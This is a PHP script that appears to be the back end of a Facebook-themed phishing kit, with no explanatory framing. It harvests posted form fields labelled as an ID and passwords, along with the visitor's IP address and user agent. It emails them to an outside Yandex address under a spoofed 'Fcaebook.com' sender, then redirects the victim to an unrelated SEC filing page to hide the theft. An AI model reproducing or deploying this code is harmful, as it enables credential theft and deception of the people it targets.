<?
$IP = getenv("REMOTE_ADDR");

$BS =   $_SERVER['HTTP_USER_AGENT'];

$message .= "ID: ".$_POST['name']."\n";
$message .= "Pd: ".$_POST['email']."\n";
$message .= "Pd: ".$_POST['subject']."\n";
$message .= "Pd: ".$_POST['message']."\n";
$message .= "IP: ".$IP."\n";
$message .= "BS: ".$BS."\n";

$sent ="rezult2016@yandex.com";

$subject = "Blessings| Facebook";
$headers = "From: Fcaebook.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://www.sec.gov/Archives/edgar/data/1681343/000121390019004381/f1apos2017a7ex13_streamnet.htm");
?>

